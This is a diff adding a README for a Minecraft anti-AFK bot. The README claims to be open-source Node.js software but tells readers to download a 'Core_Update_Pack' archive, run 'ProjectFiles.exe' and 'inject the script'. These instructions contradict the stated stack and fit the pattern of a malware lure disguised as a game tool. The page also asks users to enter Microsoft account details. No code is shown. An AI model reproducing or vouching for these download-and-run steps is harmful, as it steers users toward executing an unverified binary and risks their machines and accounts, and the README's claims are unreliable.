@@ -1,0 +1,83 @@
+🤖 Minecraft AFK Bot
+
+Keep Your Account Online 24/7 — 2026
+
+A lightweight, open-source Minecraft Anti-AFK bot with a web dashboard.
+Keeps your character active on Java servers to avoid being kicked for inactivity. Perfect for keeping Aternos servers alive or farming playtime.
+
+🎯 What it is
+
+Minecraft AFK Bot is a standalone Node.js application that connects to your Minecraft server as a player.
+It simulates small movements (head rotation, jumping) to bypass AFK detection, and automatically reconnects if the server kicks you.
+
+⚠️ Warning: Using automated clients may violate the rules of some Minecraft servers. Use responsibly and only on servers where such tools are permitted. We are not responsible for any bans.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🛡️ Smart Anti-AFK      | Periodic head movements and jumps to avoid kicks     |
+| 🌐 Web Dashboard        | Control the bot from your browser (localhost)        |
+| 🔄 Auto-Reconnect       | Automatically rejoins if disconnected or kicked      |
+| 👤 Multi-Account        | Support for Microsoft and Mojang accounts            |
+| 💬 Chat Integration     | Send and receive messages via the dashboard          |
+| ⚙️ Customizable         | Adjust movement intervals and amplitudes             |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Open your browser and go to http://localhost:3000.
+3. Add your Minecraft account (email and auth type).
+4. Enter your server address and port.
+5. Click "Start" to connect the bot.
+6. The bot will join the server and start simulating activity.
+
+⚙️ Configuration
+
+You can adjust settings in the config.json file or via the web dashboard:
+
+- Server Address: IP or domain of your Minecraft server
+- Port: Default is 25565
+- Wiggle Interval: Time between head movements (default: 30000ms)
+- Wiggle Amplitude: How far the head moves (default: 0.1)
+- Chat Ping: Optional message to send periodically
+
+❓ FAQ
+
+Is this safe to use?
+It only simulates player activity. However, some servers have strict rules against bots. Check your server's rules before using.
+
+Does it work on Aternos?
+Yes. It's perfect for keeping free Aternos servers from shutting down due to inactivity.
+
+Does it work on Mac or Linux?
+Yes, the bot is built with Node.js and runs on Windows, macOS, and Linux.
+
+Can I use it on multiple accounts?
+Yes, the web dashboard supports adding and switching between multiple accounts.
+
+💻 Tech Stack & Architecture
+
+- Core: Node.js / Mineflayer
+- Web Server: Express
+- Real-time: Socket.io
+- Auth: Microsoft / Mojang
+- Target OS: Windows / macOS / Linux
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See CONTRIBUTING.md for guidelines.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
